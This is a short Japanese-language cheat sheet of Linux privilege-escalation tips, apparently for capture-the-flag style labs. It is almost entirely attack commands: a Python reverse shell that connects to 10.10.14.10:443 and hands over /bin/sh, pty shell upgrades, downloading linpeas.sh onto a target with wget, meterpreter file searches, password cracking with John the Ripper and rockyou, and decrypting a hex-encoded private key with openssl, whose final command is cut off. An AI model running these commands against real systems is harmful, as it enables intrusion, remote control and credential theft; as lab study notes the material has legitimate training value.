# Linux 権限昇格Tips
## NW接続 / ファイル授受
## リバースシェル
Python2
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
```
```
s.connect(("10.10.14.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
```
```
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### bashシェルにアップグレード
```
python -c 'import pty; pty.spawn("/bin/bash");'
```
```
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### 対象端末でプログラムをダウンロード
```
python2 -m SimpleHTTPServer 80 
```
```
wget 10.10.14.23/linpeas.sh
```

## 内部ファイル調査
### ファイル検索
```
find ./ -name "root.*"
```

### meterpreter shell でファイル調査
```
meterpreter > search -f flag*.txt
```

## パスワード解析
```
john hash --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo
```

### その他
プレーン16進ファイルをバイナリ形式に変換
```
cat hype_key | xxd -r -p > hype_key_encrypted
```

暗号化された秘密鍵を複合
```
openssl rsa -in hype_key_encrypted -out
```
